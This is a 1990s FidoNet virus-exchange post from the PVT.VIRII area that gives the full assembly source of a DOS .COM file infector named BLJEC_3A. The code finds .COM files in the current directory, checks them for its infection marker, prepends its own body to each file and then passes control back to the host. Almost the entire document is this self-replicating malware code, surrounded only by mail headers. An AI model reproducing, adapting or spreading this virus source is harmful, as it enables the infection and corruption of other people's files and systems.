;ฤ PVT.VIRII (2:465/65.4) ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ PVT.VIRII ฤ
; Msg  : 1 of 60
; From : MeteO                               2:5030/136      Tue 09 Nov 93 09:09
; To   : -  *.*  -                                           Fri 11 Nov 94 08:10
; Subj : BLJEC_3A.ASM
;ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ
;.RealName: Max Ivanov
;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
;* Kicked-up by MeteO (2:5030/136)
;* Area : VIRUS (Int: ญไฎpฌ ๆจ๏ ฎ ขจpใแ ๅ)
;* From : Brad Frazee, 2:283/718 (06 Nov 94 16:07)
;* To   : Edwin Cleton
;* Subj : BLJEC_3A.ASM
;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
;@RFC-Path:
;ddt.demos.su!f400.n5020!f3.n5026!f2.n51!f550.n281!f512.n283!f35.n283!f7.n283!f7
;18.n283!not-for-mail
;@RFC-Return-Receipt-To: Brad.Frazee@f718.n283.z2.fidonet.org
.model  tiny
.code
org     100h
kkk:
    nop ; ID
    nop ; ID

    mov cx,80h
    mov si,0080h
    mov di,0ff7fh
    rep movsb       ; save param

    lea ax,begp     ; begin prog
    mov cx,ax
        sub     ax,100h
        mov     ds:[0fah],ax   ; len VIR
    add cx,fso
        mov     ds:[0f8h],cx   ; begin buffer W
        ADD     CX,AX
        mov     ds:[0f6h],cx   ; begin buffer R

        mov     cx,ax
    lea si,kkk
        mov     di,ds:[0f8h]
RB:     REP     MOVSB           ; move v

        stc

        LEA     DX,FFF
        MOV     AH,4EH
        MOV     CX,20H
        INT     21H     ;  find first

    or  ax,ax
    jz  LLL
    jmp done

LLL:
    MOV     AH,2FH
        INT     21H     ; get DTA

    mov ax,es:[bx+1ah]
        mov     ds:[0fch],ax   ; size
    add bx,1eh
        mov     ds:[0feh],bx   ; point to name

    clc
    mov ax,3d02h
    mov dx,bx
    int 21h     ; open file

    mov bx,ax
    mov ah,3fh
        mov     cx,ds:[0fch]
        mov     dx,ds:[0f6h]
    int 21h     ; read file

    mov bx,dx
    mov ax,[bx]
    sub ax,9090h
    jz  fin


        MOV     AX,ds:[0fch]
        mov     bx,ds:[0f6h]
        mov     [bx-2],ax      ; correct old len

    mov ah,3ch
    mov cx,00h
        mov     dx,ds:[0feh]   ; point to name
    clc
    int 21h     ; create file

    mov bx,ax       ; #
    mov ah,40h
        mov     cx,ds:[0fch]
        add     cx,ds:[0fah]
        mov     DX,ds:[0f8h]
    int 21h     ; write file


    mov ah,3eh
    int 21h     ;close file

FIN:
    stc
    mov ah,4fh
    int 21h     ; find next

    or  ax,ax
    jnz done

        JMP     lll

DONE:

    mov cx,80h
    mov si,0ff7fh
    mov di,0080h
    rep movsb       ; restore param

        MOV     AX,0A4F3H
        mov     ds:[0fff9h],ax
    mov al,0eah
    mov ds:[0fffbh],al
    mov ax,100h
    mov ds:[0fffch],ax
    lea si,begp
    lea di,kkk
    mov ax,cs
    mov ds:[0fffeh],ax
    mov kk,ax
    mov cx,fso

    db  0eah
        dw      0fff9h
kk  dw  0000h

fff db  '*?.com',0
fso dw  0005h   ; ----- alma mater


begp:
    MOV     AX,4C00H
    int     21h     ; exit

end kkk
;
;-+-  WM v2.09/91-0245
; + Origin: This virus is Microsoft Windows (2:283/718)
;=============================================================================
;
;Yoo-hooo-oo, -!
;
;
;    þ The MeยeO
;
;Syntax: TLINK objfiles, exefile, mapfile, libfiles, deffile
;
;--- Aidstest Null: /Kill
; * Origin: ๙PVT.ViRII๚main๚board๚ / Virus Research labs. (2:5030/136)

